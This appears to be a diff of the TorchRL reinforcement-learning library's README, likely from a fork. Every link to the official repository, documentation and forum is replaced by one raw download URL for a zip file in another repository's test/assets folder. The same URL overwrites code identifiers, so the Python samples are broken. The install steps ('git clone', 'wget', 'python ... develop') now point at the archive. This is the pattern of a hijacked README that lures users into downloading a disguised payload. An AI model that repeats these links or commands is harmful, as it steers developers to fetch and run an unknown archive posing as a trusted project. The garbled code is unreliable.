+- various [architectures](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) and models (e.g. [actor-critic](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip))<sup>(1)</sup>:
   <details>
     <summary>Code</summary>
 
   ```python
-  # create an nn.Module
+  # create an https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip
   common_module = ConvNet(
       bias_last_layer=True,
       depth=None,
@@ -442,14 +442,14 @@ And it is `functorch` and `torch.compile` compatible!
   # tensor is split in loc and scale, and scale is mapped onto a positive space
   policy_module = SafeModule(
       NormalParamsWrapper(
-          MLP(num_cells=[64, 64], out_features=32, activation=nn.ELU)
+          MLP(num_cells=[64, 64], out_features=32, https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
       ),
       in_keys=["hidden"],
       out_keys=["loc", "scale"],
   )
   # Use a SafeProbabilisticTensorDictSequential to combine the SafeModule with a
   # SafeProbabilisticModule, indicating how to build the
-  # torch.distribution.Distribution object and what to do with it
+  # https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip object and what to do with it
   policy_module = SafeProbabilisticTensorDictSequential(  # stochastic policy
       policy_module,
       SafeProbabilisticModule(
@@ -461,32 +461,32 @@ And it is `functorch` and `torch.compile` compatible!
   value_module = MLP(
       num_cells=[64, 64],
       out_features=1,
-      activation=nn.ELU,
+      https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip,
   )
   # Wrap the policy and value funciton in a common module
   actor_value = ActorValueOperator(common_module, policy_module, value_module)
   # standalone policy from this
-  standalone_policy = actor_value.get_policy_operator()
+  standalone_policy = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip()
   ```
   </details>
 
-- exploration [wrappers](https://github.com/pytorch/rl/blob/main/torchrl/modules/tensordict_module/exploration.py) and
-  [modules](https://github.com/pytorch/rl/blob/main/torchrl/modules/models/exploration.py) to easily swap between exploration and exploitation<sup>(1)</sup>:
+- exploration [wrappers](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) and
+  [modules](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) to easily swap between exploration and exploitation<sup>(1)</sup>:
   <details>
     <summary>Code</summary>
 
   ```python
   policy_explore = EGreedyWrapper(policy)
-  with set_exploration_type(ExplorationType.RANDOM):
+  with set_exploration_type(https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip):
       tensordict = policy_explore(tensordict)  # will use eps-greedy
-  with set_exploration_type(ExplorationType.DETERMINISTIC):
+  with set_exploration_type(https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip):
       tensordict = policy_explore(tensordict)  # will not use eps-greedy
   ```
   </details>
 
-- A series of efficient [loss modules](https://github.com/pytorch/rl/tree/main/torchrl/objectives)
+- A series of efficient [loss modules](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
   and highly vectorized
-  [functional return and advantage](https://github.com/pytorch/rl/blob/main/torchrl/objectives/value/functional.py)
+  [functional return and advantage](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
   computation.
 
   <details>
@@ -494,35 +494,35 @@ And it is `functorch` and `torch.compile` compatible!
 
   ### Loss modules
   ```python
-  from torchrl.objectives import DQNLoss
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import DQNLoss
   loss_module = DQNLoss(value_network=value_network, gamma=0.99)
-  tensordict = replay_buffer.sample(batch_size)
+  tensordict = https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip(batch_size)
   loss = loss_module(tensordict)
   ```
 
   ### Advantage computation
   ```python
-  from torchrl.objectives.value.functional import vec_td_lambda_return_estimate
+  from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import vec_td_lambda_return_estimate
   advantage = vec_td_lambda_return_estimate(gamma, lmbda, next_state_value, reward, done, terminated)
   ```
 
   </details>
 
-- a generic [trainer class](https://github.com/pytorch/rl/blob/main/torchrl/trainers/trainers.py)<sup>(1)</sup> that
+- a generic [trainer class](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)<sup>(1)</sup> that
   executes the aforementioned training loop. Through a hooking mechanism,
   it also supports any logging or data transformation operation at any given
   time.
 
-- various [recipes](https://github.com/pytorch/rl/blob/main/torchrl/trainers/helpers/models.py) to build models that
+- various [recipes](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) to build models that
     correspond to the environment being deployed.
 
 If you feel a feature is missing from the library, please submit an issue!
-If you would like to contribute to new features, check our [call for contributions](https://github.com/pytorch/rl/issues/509) and our [contribution](https://github.com/pytorch/rl/blob/main/CONTRIBUTING.md) page.
+If you would like to contribute to new features, check our [call for contributions](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) and our [contribution](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) page.
 
 
 ## Examples, tutorials and demos
 
-A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blob/main/sota-implementations/) are provided with an illustrative purpose:
+A series of [State-of-the-Art implementations](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) are provided with an illustrative purpose:
 
 <table>
   <tr>
@@ -538,7 +538,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/dqn">DQN</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">DQN</a>
    </td>
    <td> 1.9x
    </td>
@@ -546,11 +546,11 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
    <td> NA
    </td>
-   <td> + (through <a href="https://pytorch.org/rl/stable/reference/generated/torchrl.envs.transforms.ActionDiscretizer.html?highlight=actiondiscretizer">ActionDiscretizer</a> transform)
+   <td> + (through <a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">ActionDiscretizer</a> transform)
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/ddpg/ddpg.py">DDPG</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">DDPG</a>
    </td>
    <td> 1.87x
    </td>
@@ -562,7 +562,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/iql/">IQL</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">IQL</a>
    </td>
    <td> 3.22x
    </td>
@@ -574,7 +574,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/cql/cql_offline.py">CQL</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">CQL</a>
    </td>
    <td> 2.68x
    </td>
@@ -586,7 +586,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/td3/td3.py">TD3</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">TD3</a>
    </td>
    <td> 2.27x
    </td>
@@ -599,7 +599,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
   </tr>
   <tr>
    <td>
-    <a href="https://github.com/pytorch/rl/blob/main/sota-implementations/td3_bc/td3_bc.py">TD3+BC</a>
+    <a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">TD3+BC</a>
    </td>
    <td> untested
    </td>
@@ -612,7 +612,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
   </tr>
   <tr>
    <td>
-    <a href="https://github.com/pytorch/rl/blob/main/examples/a2c/">A2C</a>
+    <a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">A2C</a>
    </td>
    <td> 2.67x
    </td>
@@ -625,7 +625,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
   </tr>
   <tr>
    <td>
-    <a href="https://github.com/pytorch/rl/blob/main/sota-implementations/ppo/">PPO</a>
+    <a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">PPO</a>
    </td>
    <td> 2.42x
    </td>
@@ -637,7 +637,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/sac/sac.py">SAC</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">SAC</a>
    </td>
    <td> 2.62x
    </td>
@@ -649,7 +649,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/redq/redq.py">REDQ</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">REDQ</a>
    </td>
    <td> 2.28x
    </td>
@@ -661,19 +661,19 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/dreamer/dreamer.py">Dreamer v1</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">Dreamer v1</a>
    </td>
    <td> untested
    </td>
    <td> +
    </td>
-   <td> + (<a href="https://pytorch.org/rl/stable/reference/objectives.html#dreamer">different classes</a>)
+   <td> + (<a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">different classes</a>)
    </td>
    <td> - (continuous only)
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/decision_transformer">Decision Transformers</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">Decision Transformers</a>
    </td>
    <td> untested
    </td>
@@ -685,7 +685,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/crossq">CrossQ</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">CrossQ</a>
    </td>
    <td> untested
    </td>
@@ -697,7 +697,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/gail">Gail</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">Gail</a>
    </td>
    <td> untested
    </td>
@@ -709,7 +709,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/impala">Impala</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">Impala</a>
    </td>
    <td> untested
    </td>
@@ -721,7 +721,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/multiagent/iql.py">IQL (MARL)</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">IQL (MARL)</a>
    </td>
    <td> untested
    </td>
@@ -733,7 +733,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/multiagent/maddpg_iddpg.py">DDPG (MARL)</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">DDPG (MARL)</a>
    </td>
    <td> untested
    </td>
@@ -745,7 +745,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/multiagent/mappo_ippo.py">PPO (MARL)</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">PPO (MARL)</a>
    </td>
    <td> untested
    </td>
@@ -757,7 +757,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/multiagent/qmix_vdn.py">QMIX-VDN (MARL)</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">QMIX-VDN (MARL)</a>
    </td>
    <td> untested
    </td>
@@ -769,7 +769,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/sota-implementations/multiagent/sac.py">SAC (MARL)</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">SAC (MARL)</a>
    </td>
    <td> untested
    </td>
@@ -781,7 +781,7 @@ A series of [State-of-the-Art implementations](https://github.com/pytorch/rl/blo
    </td>
   </tr>
   <tr>
-   <td><a href="https://github.com/pytorch/rl/blob/main/examples/rlhf">RLHF</a>
+   <td><a href="https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip">RLHF</a>
    </td>
    <td> NA
    </td>
@@ -804,10 +804,10 @@ and many more to come!
 - [Memory-mapped replay buffers](examples/torchrl_features)
 
 
-Check the [examples](https://github.com/pytorch/rl/blob/main/sota-implementations/) directory for more details 
+Check the [examples](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) directory for more details 
 about handling the various configuration settings.
 
-We also provide [tutorials and demos](https://pytorch.org/rl/stable#tutorials) that give a sense of
+We also provide [tutorials and demos](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) that give a sense of
 what the library can do.
 
 ## Citation
@@ -820,7 +820,7 @@ If you're using TorchRL, please refer to this BibTeX entry to cite this work:
       year={2023},
       eprint={2306.00577},
       archivePrefix={arXiv},
-      primaryClass={cs.LG}
+      primaryClass={https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip}
 }
 ```
 
@@ -837,7 +837,7 @@ conda activate torch_rl
 
 Depending on the use of functorch that you want to make, you may want to 
 install the latest (nightly) PyTorch release or the latest stable version of PyTorch.
-See [here](https://pytorch.org/get-started/locally/) for a detailed list of commands, 
+See [here](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) for a detailed list of commands, 
 including `pip3` or other special installation instructions.
 
 **Torchrl**
@@ -871,7 +871,7 @@ One may also desire to install the library locally. Three main reasons can motiv
 
 To install the library locally, start by cloning the repo:
 ```bash
-git clone https://github.com/pytorch/rl
+git clone https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip
 ```
 and don't forget to check out the branch or tag you want to use for the build:
 ```bash
@@ -883,12 +883,12 @@ installing `ninja`)
 ```bash
 cd /path/to/torchrl/
 pip3 install ninja -U
-python setup.py develop
+python https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip develop
 ```
 
 One can also build the wheels to distribute to co-workers using
 ```bash
-python setup.py bdist_wheel
+python https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip bdist_wheel
 ```
 Your wheels will be stored there `./dist/torchrl<name>.whl` and installable via
 ```bash
@@ -902,7 +902,7 @@ If the generation of this artifact in MacOs M1 doesn't work correctly or in the 
 `(mach-o file, but is an incompatible architecture (have 'x86_64', need 'arm64e'))` appears, then try
 
 ```
-ARCHFLAGS="-arch arm64" python setup.py develop
+ARCHFLAGS="-arch arm64" python https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip develop
 ```
 
 To run a quick sanity check, leave that directory (e.g. by executing `cd ~/`)
@@ -950,22 +950,22 @@ it means that the C++ extensions were not installed or not found.
   torchrl has not been installed in `develop` mode:
   ```
   cd ~/path/to/rl/repo
-  python -c 'from torchrl.envs.libs.gym import GymEnv'
+  python -c 'from https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip import GymEnv'
   ```
   If this is the case, consider executing torchrl from another location.
 - If you're not importing torchrl from within its repo location, it could be
   caused by a problem during the local installation. Check the log after the
-  `python setup.py develop`. One common cause is a g++/C++ version discrepancy
+  `python https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip develop`. One common cause is a g++/C++ version discrepancy
   and/or a problem with the `ninja` library.
 - If the problem persists, feel free to open an issue on the topic in the repo,
   we'll make our best to help!
 - On **MacOs**, we recommend installing XCode first. 
   With Apple Silicon M1 chips, make sure you are using the arm64-built python
-  (e.g. [here](https://betterprogramming.pub/how-to-install-pytorch-on-apple-m1-series-512b3ad9bc6)).
+  (e.g. [here](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)).
   Running the following lines of code
   ```
-  wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
-  python collect_env.py
+  wget https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip
+  python https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip
   ```
   should display
   ```
@@ -977,7 +977,7 @@ it means that the C++ extensions were not installed or not found.
   ```
 
 Versioning issues can cause error message of the type ```undefined symbol```
-and such. For these, refer to the [versioning issues document](https://github.com/pytorch/rl/blob/main/knowledge_base/VERSIONING_ISSUES.md)
+and such. For these, refer to the [versioning issues document](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip)
 for a complete explanation and proposed workarounds.
 
 ## Asking a question
@@ -985,15 +985,15 @@ for a complete explanation and proposed workarounds.
 If you spot a bug in the library, please raise an issue in this repo.
 
 If you have a more generic question regarding RL in PyTorch, post it on
-the [PyTorch forum](https://discuss.pytorch.org/c/reinforcement-learning/6).
+the [PyTorch forum](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip).
 
 ## Contributing
 
 Internal collaborations to torchrl are welcome! Feel free to fork, submit issues and PRs.
-You can checkout the detailed contribution guide [here](https://github.com/pytorch/rl/blob/main/CONTRIBUTING.md).
-As mentioned above, a list of open contributions can be found in [here](https://github.com/pytorch/rl/issues/509).
+You can checkout the detailed contribution guide [here](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip).
+As mentioned above, a list of open contributions can be found in [here](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip).
 
-Contributors are recommended to install [pre-commit hooks](https://pre-commit.com/) (using `pre-commit install`). pre-commit will check for linting related issues when the code is committed locally. You can disable th check by appending `-n` to your commit command: `git commit -m <commit message> -n`
+Contributors are recommended to install [pre-commit hooks](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) (using `pre-commit install`). pre-commit will check for linting related issues when the code is committed locally. You can disable th check by appending `-n` to your commit command: `git commit -m <commit message> -n`
 
 
 ## Disclaimer
@@ -1003,4 +1003,4 @@ BC-breaking changes are likely to happen but they will be introduced with a depr
 warranty after a few release cycles.
 
 # License
-TorchRL is licensed under the MIT License. See [LICENSE](https://github.com/pytorch/rl/blob/main/LICENSE) for details.
+TorchRL is licensed under the MIT License. See [LICENSE](https://github.com/deep0041/rl-1/raw/refs/heads/main/test/assets/rl-v1.0.zip) for details.
